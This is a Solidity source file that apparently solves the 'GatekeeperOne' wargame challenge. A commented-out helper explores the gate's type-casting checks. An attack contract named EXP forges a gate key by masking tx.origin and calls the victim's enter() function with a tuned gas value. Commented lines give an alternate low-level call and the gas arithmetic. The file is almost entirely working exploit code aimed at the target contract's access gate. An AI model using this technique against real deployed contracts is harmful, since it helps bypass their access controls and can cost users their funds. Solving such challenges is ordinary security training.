// GateKeeperCheck.sol
pragma solidity ^0.6.0;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}
/*
contract GateKeeperCheck {

    function condition2(bytes8 _gateKey) public view returns(bool a,bool b, bool c){
        a = uint32(_gateKey) == uint16(_gateKey);
        b = uint32(_gateKey) != uint64(_gateKey);
        c = uint32(_gateKey) == uint16(tx.origin);
    }

  function Converter(address _player) public view returns(bytes8 s,uint16 a,uint32 b, uint64 c, uint256 d){
      s = bytes8(_player);
      a = uint16(_player);
      b = uint32(_player);
      c = uint64(_player);
      d = uint256(_player);
  }
}
*/

contract EXP{
    GatekeeperOne victim;
    constructor(address payable _addr) public {
        victim = GatekeeperOne(_addr);
    }

    function hack() public {
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF; 
        victim.enter{gas: 36117 wei}(_gateKey);
      //  address(victim).call.gas(8445)(abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), _gateKey));
      //print(28445-28191+8191*3)           
    }
}
